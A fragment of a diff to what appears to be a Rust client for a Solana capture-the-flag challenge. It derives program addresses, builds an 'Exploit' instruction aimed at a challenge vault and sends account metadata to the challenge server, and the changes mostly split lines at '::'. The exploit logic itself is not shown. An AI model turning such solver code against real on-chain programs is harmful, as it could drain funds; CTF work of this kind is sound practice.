+    let (helper_pda, _) = Pubkey::
+find_program_address(&[b"helper"], &solve);
+    let (helper_bidder_state, _) = Pubkey::
+find_program_address(
         &[b"bidder", my_auction.as_ref(), helper_pda.as_ref()], 
         &chall
     );
-    let (admin_auction, _) = Pubkey::find_program_address(
+    let (admin_auction, _) = Pubkey::
+find_program_address(
         &[b"auction", admin.as_ref(), &1u64.to_le_bytes()], 
         &chall
     );
-    let (admin_bidder_state, _) = Pubkey::find_program_address(
+    let (admin_bidder_state, _) = Pubkey::
+find_program_address(
         &[b"bidder", admin_auction.as_ref(), user.as_ref()], 
         &chall
     );
 
     {
-        let ix = solve::instruction::Exploit {};
+        let ix = solve::
+instruction::
+Exploit {};
         let data = ix.data();
-        let ix_accounts = solve::accounts::Exploit {
+        let ix_accounts = solve::
+accounts::
+Exploit {
             player: user,
             challenge_program: chall,
             vault,
@@ -1589,7 +1523,8 @@ fn main() -> Result<(), Box<dyn Error>> {
         reader.read_line(&mut line)?;
         writeln!(stream, "{}", metas.len())?;
         for meta in metas {
-            let mut meta_str = String::new();
+            let mut meta_str = String::
+new();
             meta_str.push('m');
             if meta.is_writable { meta_str.push('w'); }
             if meta.is_signer { meta_str.push('s'); }
